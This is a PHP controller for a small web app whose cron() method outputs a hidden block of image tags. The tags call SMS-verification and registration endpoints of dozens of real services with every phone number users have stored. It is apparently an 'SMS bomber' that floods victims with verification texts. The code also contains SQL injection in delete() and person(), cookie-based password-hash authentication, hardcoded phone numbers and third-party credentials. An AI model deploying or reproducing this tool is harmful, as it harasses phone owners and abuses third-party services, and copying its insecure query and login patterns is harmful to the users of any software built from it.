<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index(){
        $this->redirect('add');
    }

    public function add(){
            $data['name']=cookie('username');
            $data['pass']=cookie('pass');
            $m_user=M('user');
            $result_user_find=$m_user->where($data)->find();
            if ($result_user_find==true) {
                $this->assign("person","<p class='text-right'><a href='person'>$data[name]</a>|<a href='logout'>退出</a></p>");
                $this->display();
            }else{
                $this->assign("person","<p class='text-right'><a href='login'>登录</a>|<a href='reg'>注册</a></p>");
                $this->display();
            }
    }

    public function login(){
    	$data['name']=cookie('username');
    	$data['pass']=cookie('pass');
    	$m_user=M('user');
    	$result_user_find=$m_user->where($data)->find();
    	if ($result_user_find==true) {
    		$this->redirect('add');
    	}else{
    		$this->display();
    	}
    }

    public function reg(){
    	$data['name']=cookie('username');
    	$data['pass']=cookie('pass');
    	$m_user=M('user');
    	$result_user_find=$m_user->where($data)->find();
    	if ($result_user_find==true) {
    		$this->redirect('index');
    	}else{
    		$this->display();
    	}
    }

    public function person(){
        $data['name']=cookie('username');
        $data['pass']=cookie('pass');
        $m_user=M('user');
        $result_user_find=$m_user->where($data)->find();
        if ($result_user_find==true) {
            $username=cookie('username');
            $m_number=M('number');
            $result_number_select=$m_number->where("admin='$username'")->select();
            $this->assign('number',$result_number_select);
            $this->assign('username',$username);
            $this->display();
        }else{
            $this->error('请先登录！');
        }
    }

    public function checkadd(){
    		if (isset($_POST['number']) and strlen($_POST['number']) == 11) {
    			$data['name']=cookie('username');
    			$data['pass']=cookie('pass');
    			$m_user=M('user');
    			$result_user_find=$m_user->where($data)->find();
    			if ($result_user_find==true) {
    				$data['number']=$_POST['number'];
    				$data['admin']=cookie('username');
    				$m_number=M('number');
    				$i=$m_number->create($data);
    				$result_number_create=$m_number->add();
    				if ($result_number_create==true) {
    					$this->success('添加成功！');
    				}else{
    					$this->error('添加失败！');
    				}
    			}else{
    				$this->error('不要伪造COOKIES！');
    			}
    		}else{
    			$this->error('参数错误！');
    		}
    }

    public function checklog(){
    	if (isset($_POST['email']) and isset($_POST['pass'])) {
    		$name=$data['name']=$_POST['email'];
    		$pass=$data['pass']=md5($_POST['pass']);
    		$m_user=M('user');
    		$result_user_find=$m_user->where($data)->find();
    		if ($result_user_find==true) {
    			cookie('username',$name,3600);
    			cookie('pass',$pass,3600);
    			$this->success('登录成功！');
    		}else{
    			$this->error('帐号密码错误！');
    		}

    	}else{
    		$this->error('请输入信息！');
    	}
    }

    public function checkreg(){
    	if (isset($_POST['email']) and isset($_POST['pass'])) {
    		$name=$_POST['email'];
    		$pass=md5($_POST['pass']);
    		$m_user=M('user');
    		$data['name']=$name;
    		$data['pass']=$pass;
    		$i=$m_user->create($data);
    		$result_user_add=$m_user->add();
    		if ($result_user_add==true) {
    			cookie('username',$name,3600);
    			cookie('pass',$pass,3600);
    			$this->success('注册成功！');
    		}else{
    			$this->error('注册失败！');
    		}
    	}else{
    		$this->error('请输入信息！');
    	}
    }

    public function delete($number){
    	$m_user=M('user');
    	$data['name']=cookie('username');
    	$data['pass']=cookie('pass');
    	$result_user_find=$m_user->where($data)->find();
    	if ($result_user_find==true) {
    		$m_number=M('number');
    		$result_number_delete=$m_number->where("number=$number")->delete();
    		if ($result_number_delete==true) {
    			$this->success('删除成功！');
    		}else{
                $this->error('删除失败！');
            }
    	}else{
    		$this->error('身份验证失败！');
    	}
    }

    public function logout(){
        cookie('username',null);
        cookie('pass',null);
        $this->success('注销成功！');
    }

    public function cron(){
        $m_number=M('number');
        $result_number_select=$m_number->where()->select();
        $num=count($result_number_select);
        for ($i=0; $i < $num; $i++) { 
            $d=$result_number_select[$i]['number'];
            echo "<div style='display:none'>
<img src='https://www.yypt.com/finance/regist!sendValidateCode.do?mobile=$d' alt=''/>
<img src='http://member.88.com.cn/user/getmobilecode.html/?ac=send&mobile=$d' alt=''/>
<img src='http://ac.ppdai.com/validatecode?callback=jQuery17108819785887872924_1407124610768&ValidateType=Mobile&MobilePhone=$d&_=1407124716359' alt=''/>
<img src='https://www.firstp2p.com/user/MCode/?type=1&isrsms=0&t=1407124856875&mobile=$d' alt=''/>
<img src='http://www.ccb-life.com.cn/lifeebiz/view/management/userRegister.jsp/?mobile=$d&_action=checkMoblie' alt=''/>
<img src='http://www.ccb-life.com.cn/lifeebiz/view/management/userRegister.jsp/?mobile=$d&_action=sendValidationCode' alt=''/>
<img src='http://www.epicc.com.cn/ecar/proposal/checkmobile/?addCheckValuesFlag=&areaCode=11000000&mobile=$d&citySelect=11000000&proSelectedtext=%E5%8C%97%E4%BA%AC&citySelectedtext=%E5%8C%97%E4%BA%AC&cooperator=&next=0.3737380872480571' alt=''/>
<img src='http://www.epicc.com.cn/ecar/followup/callBack/saveCustomerToHF?time=1407125058704/?CallBack.mobile=$d&CallBack.customerCName=%E6%9D%8E&CallBack.priority=0&CallBack.areaCode=11000000&IsblackFlag=0&addCheckValuesFlag=0&ccaFlag=0&cityCode=11000000&proposalFinished=false&next=0.37693149223923683' alt=''/>
<img src='https://passport.m.jd.com/user/getCode.action?mobile=$d&sid=182328dc09ecd4eee908708e0bfd5496' alt=''/>
<img src='https://passport.jd.com/emReg/sendMobileCode?mobile=$d&r=0.9010949897739119' alt=''/>
<img src='https://passport.jd.com/emReg/isMobileEngaged?mobile=$d&r=0.08241349037594953' alt=''/>
<img src='http://www.guahao.com/validcode/json/mobile/$d/REG_MOBILE/ec526aca3bdf5a81dd8d96ad521134da?_=1403700491564' alt=''/>
<img src='http://www.guahao.com/validcode/json/mobile/$d/REG_MOBILE/cebaf071614ac29f9ad6c692b474a46f?_=1366925898545' alt=''/>
<img src='http://www.guahao.com/user/json/existloginid/$d?_=1403700491106' alt=''/>
<img src='http://m.ctrip.com/html5/ClientData/SendVerifyCode/$d' alt=''/>
<img src='http://m.ctrip.com/html5/Account/UserRegister/?UID=$d&Password=0e831a33923e4725ee279f645ffb717ae4d011f9a19e1c4252027741156d135f6c58737223feab36bac4e3a1a434c52a3b7395d01e5f68ca81a6e0c8215601c1fe5b1eaa53db6fb23f3cc09338438a50a25c9e3f50a02574df233c8a313c634c9c50aaa88f1b6d2ef679aa3a53638d8ac9fa46354d16927e253f7c44970fa3e2&Sales=&SourceId=' alt=''/>
<img src='https://passport.yhd.com/mobile/passportService?1=1&methodName=sendValidCodeByPhone&methodBody=%7B%22mobileServiceArgs%22%3A%7B%22mobileValidCodeKey%22%3A%22mobileRegister%22%2C%22userPhone%22%3A%2213281116967%22%2C%22userToken%22%3A%223b1c150f-0b1c-4930-929b-819260284b46%22%7D%2C%22trader%22%3A%7B%22clientAppVersion%22%3A%223.1.8%22%2C%22clientSystem%22%3A%22android%22%2C%22clientVersion%22%3A%22AMOI+N821%2C17%2C4.2.2%22%2C%22deviceCode%22%3A%2200000000-2b0b-86e9-0000-000000000000%22%2C%22interfaceVersion%22%3A%221.3.5%22%2C%22latitude%22%3A%2233.614806%22%2C%22longitude%22%3A%22114.65503%22%2C%22protocol%22%3A%22HTTPXML%22%2C%22provinceId%22%3A%221%22%2C%22traderName%22%3A%22androidSystem%22%2C%22traderPassword%22%3A%22sCarce%218%22%7D%7D' alt=''/>
<img src='https://passport.yhd.com/mobile/passportService?1=1&methodName=sendValidCodeByPhone&methodBody=%7B%22mobileServiceArgs%22%3A%7B%22mobileValidCodeKey%22%3A%22mobileRegister%22%2C%22userPhone%22%3A%2213281116967%22%2C%22userToken%22%3A%223b1c150f-0b1c-4930-929b-819260284b46%22%7D%2C%22trader%22%3A%7B%22clientAppVersion%22%3A%223.1.8%22%2C%22clientSystem%22%3A%22android%22%2C%22clientVersion%22%3A%22AMOI+N821%2C17%2C4.2.2%22%2C%22deviceCode%22%3A%2200000000-2b0b-86e9-0000-000000000000%22%2C%22interfaceVersion%22%3A%221.3.5%22%2C%22latitude%22%3A%2233.614806%22%2C%22longitude%22%3A%22114.65503%22%2C%22protocol%22%3A%22HTTPXML%22%2C%22provinceId%22%3A%221%22%2C%22traderName%22%3A%22androidSystem%22%2C%22traderPassword%22%3A%22sCarce%218%22%7D%7D' alt=''/>
<img src='http://i.qichetong.com/Ajax/Authenservice/MobileVerifyCode.ashx/?r=0.3434412432940654&popType=&LoginName=$d' alt=''/>
<img src='http://i.qichetong.com/Ajax/Authenservice/MobileVerifyCode.ashx/?popType=0&r=0.8167970664799213&LoginName=$d' alt=''/>
<img src='http://www.elong.com/home/isajax/ElongNewIndex/SendAppSMS?_=1405613807723&mobile=$d' alt=''/>
<img src='http://www.elong.com/home/isajax/ElongNewIndex/SendAppSMS?_=1405613807723&mobile=$d' alt=''/>
<img src='http://w.sohu.com/t2/tologin.do?mnd=$d&qr=1' alt=''/>
<img src='http://passport.sohu.com/regist/send_sms/?mobile=$d' alt=''/>
<img src='http://my.tv.sohu.com/user/reg/getmstatus.do?passport=$d' alt=''/>
<img src='http://m.passport.sohu.com/r/sendMVcodeaa?mobile=$d' alt=''/>
<img src='http://www.kuaiyoujia.com/Register/GetVerificationCodeOnRegist/?mobile=$d' alt=''/>
<img src='http://download.feixin.10086.cn/download/downloadFLToMobile.action?id=50&no=$d&isCheckCode=1' alt=''/>
<img src='http://u.tieyou.com/api/user.html?act=checkMobileAccount&mobile=$d' alt=''/>
<img src='http://u.tieyou.com/api/user.html/?act=checkMobileAccount&action=u.user&mobile=$d' alt=''/>
<img src='http://m.passport.sohu.com/r/mobile?mobile=$d&password=asdfghjkiu&agree=true' alt=''/>
<img src='http://m.passport.sohu.com/r/mobile?mobile=$d&password=asdfghjkiu&agree=true' alt=''/>
<img src='http://sso.letv.com/user/mobileRegCode/mobile/=$d/mobilecodeletvid/' alt=''/>
<img src='http://sso.letv.com/user/mobileRegCode/mobile/$d/mobilecodeletvid/k961601363512388' alt=''/>
<img src='http://sso.letv.com/user/mobileRegCode/mobile/$d/mobilecodeletvid/f219111395819034' alt=''/>
<img src='http://sso.letv.com/user/mobileRegCode/mobile/$d/mobilecodeletvid/c326961366927138' alt=''/>
<img src='http://sso.letv.com/user/mobileRegCode/mobile/$d/mobilecodeletvid/' alt=''/>
<img src='http://sso.letv.com/user/checkMobileExists/mobile/$d?jsonp=jQuery17103937588292174041_1405268556755&_=1405268598815' alt=''/>
<img src='http://sso.letv.com/user/checkMobileExists/mobile/$d?jsonp=jQuery17103937588292174041_1405268556754&_=1405268579859' alt=''/>
<img src='http://sso.letv.com/user/checkMobileExists/mobile/$d?jsonp=jQuery171008569038612768054_1402390605865&_=1402390613618' alt=''/>
<img src='http://218.28.199.137/m/mobile/registerSms/?mobile=$d' alt=''/>
<img src='http://218.206.191.106/idm/usermgr/usernameCheck?mobilePhone=$d' alt=''/>
<img src='http://211.152.60.227:8029/Api/index.php/Member/registerValidateCode/?phone=$d' alt=''/>
<img src='http://211.136.93.21/hfwebbusi/pay/saveOrder.do?mobileId=$d' alt=''/>
<img src='http://180.168.178.213:8888/MemberMag.asmx/SendVeCode?sob_password=d5299c2fe78d75a37b0d3f4715d678bb&sob_code=79388bb8a33bbe3d403d7e76d6d12d24&sob_hotelgroup_id=8d5e957f297893487bd98fa830fa6413&phoneNum=$d&act=0' alt=''/>
<img src='http://114.112.174.170/serviceCor/regfirst.action?mobile=$d' alt=''/>
<img src='http://111.1.37.36:8686/link_smssend.asp?username=wzysba&password=wzysba&mobile=$d&content=%C4%FA%B5%C4%D7%A2%B2%E1%D1%E9%D6%A4%C2%EB%CA%C7%3A476948&sendtime=' alt=''/>
<img src='http://www.ximalaya.com/passport/mobile/getVerifyCode/?msgType=4&phone_num=$d' alt=''/>
<img src='http://3g.500.com/api/sendcode?mobilenum=$d' alt=''/>
<img src='https://passport.bankcomm.com/ajax.php/?a=sendvcode&uname=$d&regbinding=0' alt=''/>
<img src='https://passport.m.jd.com/user/getCode.json?&mobile=$d&sid=5c27553bd5524170c515edd6ffba88fa' alt=''/>
<img src='https://passport.m.jd.com/user/getCode.action?mobile=$d&sid=5c27553bd5524170c515edd6ffba88fa' alt=''/>
<img src='http://zhoukou.baixing.com/oz/verify/x/reg?mobile=$d' alt=''/>
<img src='http://zhoukou.baixing.com/oz/voice/?mobile=$d' alt=''/>
<img src='http://zhoukou.baixing.com/c/ic/voiceCode' alt=''/>
<img src='http://zhengzhou.baixing.com/oz/verify/x/reg?mobile=$d' alt=''/>
<img src='http://zhengzhou.baixing.com/oz/voice/?mobile=$d' alt=''/>
<img src='http://login.tudou.com/passport/sendSmsMsg.do?jsoncallback=jQuery17209491650222335011_1407073475324&type=0&mobile=$d&_=1407073499462' alt=''/>
<img src='http://3g.51job.com/my/register.php/?phone=$d&submit=1&verify_param=7a8654f998c7608fb56e80e0f8a44ad3' alt=''/>
<img src='http://3g.51job.com/my/register.php?topage=3&verify_param=74eaa3ff5a1ede46f2d98d8b393be1f3&phone=$d&submit=1&time=1407074694'alt=''/>
<img src='http://218.200.227.123/order/cmnet/goto_validate_code/?msisdn=$d' alt=''/>
<img src='http://m.10086.cn/wireless/jsp/N/migu/n/regVip.jsp/?action=submitMobile&k=002000A&sch=&lran=eXMDuZ&pageid=W1P1%242107818S2R2L1&mobile=$d' alt=''/>
<img src='http://m.10086.cn/wireless/jsp/N/migu/n/regVip.jsp/?action=submitMobile&k=002000A&sch=&lran=eXMDuZ&pageid=W1P1%242107818S2R2L1&mobile=$d' alt=''/>
<img src='http://m.51job.com//ajax/in/getphonecode.ajax.php?phone=$d&type=5' alt=''/>
<img src='http://my.51job.com/AjaxAction/mobile_code/send_mobile_code.php/?mobile=$d&apptype=4' alt=''/>
<img src='http://m.qichetong.com/AuthenService/register/Ajax/GetCode.ashx?t=1&txtLoginName=$d&r=0.41990769281983376' alt=''/>
<img src='https://register.shengpay.com/personal/sendRegisterSms.htm/?mobile=$d' alt=''/>
<img src='http://m.qichetong.com/AuthenService/register/Ajax/GetCode.ashx?t=1&txtLoginName=$d&r=0.0194694004021585' alt=''/>
<img src='https://user.95516.com/uc-cdhd-web/rest/reg/sendmobilecaptcha/?mobile=$d&msgType=01' alt=''/>
<img src='http://data.zgzcw.com/newzgzcw/sendMessage.jsp?mobile=$d&callback=jQuery171007485370174981654_1407076493305&_=1407076509842' alt=''/>
<img src='http://www.500.com/wap/ajax.php?tel=$d&act=md&jsonpcallback=jsonp1407076681822' alt=''/>
<img src='http://www.zsye.com/applyServlet/?userid=637810&opretype=2&sourceName=GW&isHOME=try.jsp&phone=$d&isphone=$d&babyBirthday=20140102' alt=''/>
<img src='http://zg51.net/web/register_up.asp/?mobile=$d&password=qweasda&tj_custid=0&verify=e33fe4723f457dee' alt=''/>
<img src='http://pim.10086.cn/ajax/mt.php/? crumb=a9a9d88835a09adbeada414c9fa44b4d&mobile=$d&channel=' alt=''/>
<img src='https://caiyun.feixin.10086.cn/Mcloud/sso/sendmsms.action/? date=1407077678283&account=$d' alt=''/>
<img src='http://cbc.iuoooo.com/Register/GetAuthCode/? LoginCode=$d' alt=''/>
<img src='http://www.lecai.com/user/ajax_register_phone_authcode_send.php?phone=$d' alt=''/>
<img src='http://hwid1.vmall.com:8080/oauth2/oauth2/ajaxHandler_in/getMobileValiCode?mobile=008613281116967&smsReqType=4&session_code_key=p_reg_phone_session_ramdom_code_key&reqClientType=26&pageToken=xdwMu5EeUPC7xkKLdHWcsdSFxZg8TxYC&lang=zh&reflushCode=0.9925481270270826' alt=''/>
<img src='http://passport.115.com/?ct=ajax&ac=ajax_register_validate&reg[mobile]=$d&_=1407482013965' alt=''/>
<img src='http://passport.115.com/?ct=ajax&ac=ajax_smscode&_token=1c3bcfwLc1rPQtERvs4h5Ejb1klfGnFca8T0FGY5BvexelJ2opj4ZxzsWAeTvQyI8VmdNziXlGSA&m=$d' alt=''/>
<img src='http://passport.115.com/?ct=ajax&ac=ajax_chekuser&account=113281116967&type=mobile&val=$d&_=1407482070487' alt=''/>
<img src='http://i.360.cn/smsApi/sendsmscode?account=$d&condition=2&r=0.9476780155673623&callback=QiUserJsonP1407482642243' alt=''/>
<img src='http://id.ourgame.com/passport!exist.do?passport=$d&_=1407483677524' alt=''/>
<img src='http://id.ourgame.com/mobilepassport!getMobileYzm.do?passport=$d' alt=''/>
<img src='http://weburs.ku.163.com/quickReg/sendMobileCaptcha?promark=31j8lmq9&id=null&output=json&m_username=$d&callback=jQuery16405770837608724833_1407483725809&_=1407483776680' alt=''/>
<img src='http://weburs.ku.163.com/quickReg/sendMobileCaptcha?promark=ab47ge1s&id=null&output=json&m_username=$d&callback=jQuery16409621100642252713_1407483945550&_=1407483959565' alt=''/>
<img src='http://gwpassport2.woniu.com/v2/sendsms_h9fp972k?jsoncallback=jQuery17209502564975991845_1407483940698&mobile=$d&_=1407484002669' alt=''/>
<img src='http://cn.ae.aliexpress.com/wsuser/join/SmsSenderAjax.htm/?mobileNo=$d&_csrf_token_=m6bptqecyqv0&t=1407484167337' alt=''/>
<img src='https://aq.99.com/AjaxAction/AC_register.ashx/?action=verifyusernameofmobile&txtUserNameOfMobile=$d' alt=''/>
<img src='https://aq.99.com/AjaxAction/AC_register.ashx?url=http://www.99.com/?action=createcodeofmobileregister&txtUserNameOfMobile=$d' alt=''/>
<img src='http://reg.ztgame.com/registe/sendMobileCode/?check=&phoneNum=$d' alt=''/>
<img src='http://www.169money.com/AjaxWeb/GetCode.ashx?0.4810091208200902/?Tel=$d' alt=''/>
<img src='http://www.169money.com/AjaxWeb/AddBmFailure.ashx?0.36719161039218307/?UserName=&UserTel=$d&UserPwd=dj1818&Code=&Card=&Grade=1&Default=&PageName=%25u4EA4%25u6613%25u8F6F%25u4EF629&Operation=%25u514D%25u8D39%25u4E0B%25u8F7D&Typaes=129' alt=''/>
<img src='http://lxbjs.baidu.com/float/_c.js?vtel=$d&siteid=4882386&bdcbid=e63c8936-55d6-4d23-9046-d28550cf2f5d&code=E0F7B4FACD65AA17859DBBEA70811673ED3E72AAF845B28CE932C0B27C93E9D6672119895F9A72806F03512459789F986A08049390A06C3B494320DA607CFCE70C8CC66A82FBE41C21242BBCC526AD52A18DEFF09E8AF158E37BBF0CE925562D&t=1407485335002&callback=_lxb_jsonp_hyl8ff16_' alt=''/>
<img src='http://www.36936.com/handler/RegUserSendSms.ashx?&type=1&mobile=$d' alt=''/>
<img src='https://security.9666.cn/register/sendPhoneCodeAjax.action?phone=$d' alt=''/>
<img src='http://shenzhen.lashou.com/ajax/signmobile.php?act=send_code&bind_mobile=$d' alt=''/>
<img src='http://shenzhen.lashou.com/ajax/signmobile.php?act=checkmobile&mobile=$d' alt=''/>
<img src='http://www.quxinwang.com/Codes/Register.aspx?&_=1407633645592&tag=getcode&un=$d' alt=''/>
<img src='http://www.jumei.com/i/account/ajax_send_sms_for_mobile_register?mobile=$d' alt=''/>
<img src='http://member.88.com.cn/user/getmobilecode.html/?ac=send&mobile=$d' alt=''/>
<img src='http://ac.ppdai.com/validatecode?callback=jQuery17108819785887872924_1407124610768&ValidateType=Mobile&MobilePhone=$d&_=1407124716359' alt=''/>
<img src='https://www.firstp2p.com/user/MCode/?type=1&isrsms=0&t=1407124856875&mobile=$d' alt=''/>
<img src='http://www.ccb-life.com.cn/lifeebiz/view/management/userRegister.jsp/?mobile=$d&_action=checkMoblie' alt=''/>
<img src='http://www.ccb-life.com.cn/lifeebiz/view/management/userRegister.jsp/?mobile=$d&_action=sendValidationCode' alt=''/>
<img src='http://www.epicc.com.cn/ecar/proposal/checkmobile/?addCheckValuesFlag=&areaCode=11000000&mobile=$d&citySelect=11000000&proSelectedtext=%E5%8C%97%E4%BA%AC&citySelectedtext=%E5%8C%97%E4%BA%AC&cooperator=&next=0.3737380872480571' alt=''/>
<img src='http://www.epicc.com.cn/ecar/followup/callBack/saveCustomerToHF?time=1407125058704/?CallBack.mobile=$d&CallBack.customerCName=%E6%9D%8E&CallBack.priority=0&CallBack.areaCode=11000000&IsblackFlag=0&addCheckValuesFlag=0&ccaFlag=0&cityCode=11000000&proposalFinished=false&next=0.37693149223923683' alt=''/>
<img src='https://passport.m.jd.com/user/getCode.action?mobile=$d&sid=182328dc09ecd4eee908708e0bfd5496' alt=''/>
<img src='https://passport.jd.com/emReg/sendMobileCode?mobile=$d&r=0.9010949897739119' alt=''/>
<img src='https://passport.jd.com/emReg/isMobileEngaged?mobile=$d&r=0.08241349037594953' alt=''/>
<img src='http://www.guahao.com/validcode/json/mobile/$d/REG_MOBILE/ec526aca3bdf5a81dd8d96ad521134da?_=1403700491564' alt=''/>
<img src='http://www.guahao.com/validcode/json/mobile/$d/REG_MOBILE/cebaf071614ac29f9ad6c692b474a46f?_=1366925898545' alt=''/>
<img src='http://www.guahao.com/user/json/existloginid/$d?_=1403700491106' alt=''/>
<img src='http://m.ctrip.com/html5/ClientData/SendVerifyCode/$d' alt=''/>
<img src='http://m.ctrip.com/html5/Account/UserRegister/?UID=$d&Password=0e831a33923e4725ee279f645ffb717ae4d011f9a19e1c4252027741156d135f6c58737223feab36bac4e3a1a434c52a3b7395d01e5f68ca81a6e0c8215601c1fe5b1eaa53db6fb23f3cc09338438a50a25c9e3f50a02574df233c8a313c634c9c50aaa88f1b6d2ef679aa3a53638d8ac9fa46354d16927e253f7c44970fa3e2&Sales=&SourceId=' alt=''/>
<img src='https://passport.yhd.com/mobile/passportService?1=1&methodName=sendValidCodeByPhone&methodBody=%7B%22mobileServiceArgs%22%3A%7B%22mobileValidCodeKey%22%3A%22mobileRegister%22%2C%22userPhone%22%3A%2215207557194%22%2C%22userToken%22%3A%223b1c150f-0b1c-4930-929b-819260284b46%22%7D%2C%22trader%22%3A%7B%22clientAppVersion%22%3A%223.1.8%22%2C%22clientSystem%22%3A%22android%22%2C%22clientVersion%22%3A%22AMOI+N821%2C17%2C4.2.2%22%2C%22deviceCode%22%3A%2200000000-2b0b-86e9-0000-000000000000%22%2C%22interfaceVersion%22%3A%221.3.5%22%2C%22latitude%22%3A%2233.614806%22%2C%22longitude%22%3A%22114.65503%22%2C%22protocol%22%3A%22HTTPXML%22%2C%22provinceId%22%3A%221%22%2C%22traderName%22%3A%22androidSystem%22%2C%22traderPassword%22%3A%22sCarce%218%22%7D%7D' alt=''/>
<img src='https://passport.yhd.com/mobile/passportService?1=1&methodName=sendValidCodeByPhone&methodBody=%7B%22mobileServiceArgs%22%3A%7B%22mobileValidCodeKey%22%3A%22mobileRegister%22%2C%22userPhone%22%3A%2215207557194%22%2C%22userToken%22%3A%223b1c150f-0b1c-4930-929b-819260284b46%22%7D%2C%22trader%22%3A%7B%22clientAppVersion%22%3A%223.1.8%22%2C%22clientSystem%22%3A%22android%22%2C%22clientVersion%22%3A%22AMOI+N821%2C17%2C4.2.2%22%2C%22deviceCode%22%3A%2200000000-2b0b-86e9-0000-000000000000%22%2C%22interfaceVersion%22%3A%221.3.5%22%2C%22latitude%22%3A%2233.614806%22%2C%22longitude%22%3A%22114.65503%22%2C%22protocol%22%3A%22HTTPXML%22%2C%22provinceId%22%3A%221%22%2C%22traderName%22%3A%22androidSystem%22%2C%22traderPassword%22%3A%22sCarce%218%22%7D%7D' alt=''/>
<img src='http://i.qichetong.com/Ajax/Authenservice/MobileVerifyCode.ashx/?r=0.3434412432940654&popType=&LoginName=$d' alt=''/>
<img src='http://i.qichetong.com/Ajax/Authenservice/MobileVerifyCode.ashx/?popType=0&r=0.8167970664799213&LoginName=$d' alt=''/>
<img src='http://www.elong.com/home/isajax/ElongNewIndex/SendAppSMS?_=1405613807723&mobile=$d' alt=''/>
<img src='http://www.elong.com/home/isajax/ElongNewIndex/SendAppSMS?_=1405613807723&mobile=$d' alt=''/>
<img src='http://w.sohu.com/t2/tologin.do?mnd=$d&qr=1' alt=''/>
<img src='http://passport.sohu.com/regist/send_sms/?mobile=$d' alt=''/>
<img src='http://my.tv.sohu.com/user/reg/getmstatus.do?passport=$d' alt=''/>
<img src='http://m.passport.sohu.com/r/sendMVcodeaa?mobile=$d' alt=''/>
<img src='http://www.kuaiyoujia.com/Register/GetVerificationCodeOnRegist/?mobile=$d' alt=''/>
<img src='http://download.feixin.10086.cn/download/downloadFLToMobile.action?id=50&no=$d&isCheckCode=1' alt=''/>
<img src='http://u.tieyou.com/api/user.html?act=checkMobileAccount&mobile=$d' alt=''/>
<img src='http://u.tieyou.com/api/user.html/?act=checkMobileAccount&action=u.user&mobile=$d' alt=''/>
<img src='http://m.passport.sohu.com/r/mobile?mobile=$d&password=asdfghjkiu&agree=true' alt=''/>
<img src='http://m.passport.sohu.com/r/mobile?mobile=$d&password=asdfghjkiu&agree=true' alt=''/>
<img src='http://sso.letv.com/user/mobileRegCode/mobile/=$d/mobilecodeletvid/' alt=''/>
<img src='http://sso.letv.com/user/mobileRegCode/mobile/$d/mobilecodeletvid/k961601363512388' alt=''/>
<img src='http://sso.letv.com/user/mobileRegCode/mobile/$d/mobilecodeletvid/f219111395819034' alt=''/>
<img src='http://sso.letv.com/user/mobileRegCode/mobile/$d/mobilecodeletvid/c326961366927138' alt=''/>
<img src='http://sso.letv.com/user/mobileRegCode/mobile/$d/mobilecodeletvid/' alt=''/>
<img src='http://sso.letv.com/user/checkMobileExists/mobile/$d?jsonp=jQuery17103937588292174041_1405268556755&_=1405268598815' alt=''/>
<img src='http://sso.letv.com/user/checkMobileExists/mobile/$d?jsonp=jQuery17103937588292174041_1405268556754&_=1405268579859' alt=''/>
<img src='http://sso.letv.com/user/checkMobileExists/mobile/$d?jsonp=jQuery171008569038612768054_1402390605865&_=1402390613618' alt=''/>
<img src='http://218.28.199.137/m/mobile/registerSms/?mobile=$d' alt=''/>
<img src='http://218.206.191.106/idm/usermgr/usernameCheck?mobilePhone=$d' alt=''/>
<img src='http://211.152.60.227:8029/Api/index.php/Member/registerValidateCode/?phone=$d' alt=''/>
<img src='http://211.136.93.21/hfwebbusi/pay/saveOrder.do?mobileId=$d' alt=''/>
<img src='http://180.168.178.213:8888/MemberMag.asmx/SendVeCode?sob_password=d5299c2fe78d75a37b0d3f4715d678bb&sob_code=79388bb8a33bbe3d403d7e76d6d12d24&sob_hotelgroup_id=8d5e957f297893487bd98fa830fa6413&phoneNum=$d&act=0' alt=''/>
<img src='http://114.112.174.170/serviceCor/regfirst.action?mobile=$d' alt=''/>
<img src='http://111.1.37.36:8686/link_smssend.asp?username=wzysba&password=wzysba&mobile=$d&content=%C4%FA%B5%C4%D7%A2%B2%E1%D1%E9%D6%A4%C2%EB%CA%C7%3A476948&sendtime=' alt=''/>
<img src='http://www.ximalaya.com/passport/mobile/getVerifyCode/?msgType=4&phone_num=$d' alt=''/>
<img src='http://3g.500.com/api/sendcode?mobilenum=$d' alt=''/>
<img src='https://passport.bankcomm.com/ajax.php/?a=sendvcode&uname=$d&regbinding=0' alt=''/>
<img src='https://passport.m.jd.com/user/getCode.json?&mobile=$d&sid=5c27553bd5524170c515edd6ffba88fa' alt=''/>
<img src='https://passport.m.jd.com/user/getCode.action?mobile=$d&sid=5c27553bd5524170c515edd6ffba88fa' alt=''/>
<img src='http://zhoukou.baixing.com/oz/verify/x/reg?mobile=$d' alt=''/>
<img src='http://zhoukou.baixing.com/oz/voice/?mobile=$d' alt=''/>
<img src='http://zhengzhou.baixing.com/oz/verify/x/reg?mobile=$d' alt=''/>
<img src='http://zhengzhou.baixing.com/oz/voice/?mobile=$d' alt=''/>
<img src='http://login.tudou.com/passport/sendSmsMsg.do?jsoncallback=jQuery17209491650222335011_1407073475324&type=0&mobile=$d&_=1407073499462' alt=''/>
<img src='http://3g.51job.com/my/register.php/?phone=$d&submit=1&verify_param=7a8654f998c7608fb56e80e0f8a44ad3' alt=''/>
<img src='http://3g.51job.com/my/register.php?topage=3&verify_param=74eaa3ff5a1ede46f2d98d8b393be1f3&phone=$d&submit=1&time=1407074694'alt=''/>
<img src='http://218.200.227.123/order/cmnet/goto_validate_code/?msisdn=$d' alt=''/>
<img src='http://m.10086.cn/wireless/jsp/N/migu/n/regVip.jsp/?action=submitMobile&k=002000A&sch=&lran=eXMDuZ&pageid=W1P1%242107818S2R2L1&mobile=$d' alt=''/>
<img src='http://m.10086.cn/wireless/jsp/N/migu/n/regVip.jsp/?action=submitMobile&k=002000A&sch=&lran=eXMDuZ&pageid=W1P1%242107818S2R2L1&mobile=15890000000' alt=''/>
<img src='http://m.51job.com//ajax/in/getphonecode.ajax.php?phone=$d&type=5' alt=''/>
<img src='http://my.51job.com/AjaxAction/mobile_code/send_mobile_code.php/?mobile=$d&apptype=4' alt=''/>
<img src='http://m.qichetong.com/AuthenService/register/Ajax/GetCode.ashx?t=1&txtLoginName=$d&r=0.41990769281983376' alt=''/>
<img src='https://register.shengpay.com/personal/sendRegisterSms.htm/?mobile=$d' alt=''/>
<img src='http://m.qichetong.com/AuthenService/register/Ajax/GetCode.ashx?t=1&txtLoginName=$d&r=0.0194694004021585' alt=''/>
<img src='https://user.95516.com/uc-cdhd-web/rest/reg/sendmobilecaptcha/?mobile=$d&msgType=01' alt=''/>
<img src='http://data.zgzcw.com/newzgzcw/sendMessage.jsp?mobile=$d&callback=jQuery171007485370174981654_1407076493305&_=1407076509842' alt=''/>
<img src='http://www.500.com/wap/ajax.php?tel=$d&act=md&jsonpcallback=jsonp1407076681822' alt=''/>
<img src='http://www.zsye.com/applyServlet/?userid=637810&opretype=2&sourceName=GW&isHOME=try.jsp&phone=$d&isphone=$d&babyBirthday=20140102' alt=''/>
<img src='http://zg51.net/web/register_up.asp/?mobile=$d&password=qweasda&tj_custid=0&verify=e33fe4723f457dee' alt=''/>
<img src='http://pim.10086.cn/ajax/mt.php/? crumb=a9a9d88835a09adbeada414c9fa44b4d&mobile=$d&channel=' alt=''/>
<img src='https://caiyun.feixin.10086.cn/Mcloud/sso/sendmsms.action/? date=1407077678283&account=$d' alt=''/>
<img src='http://cbc.iuoooo.com/Register/GetAuthCode/? LoginCode=$d' alt=''/>
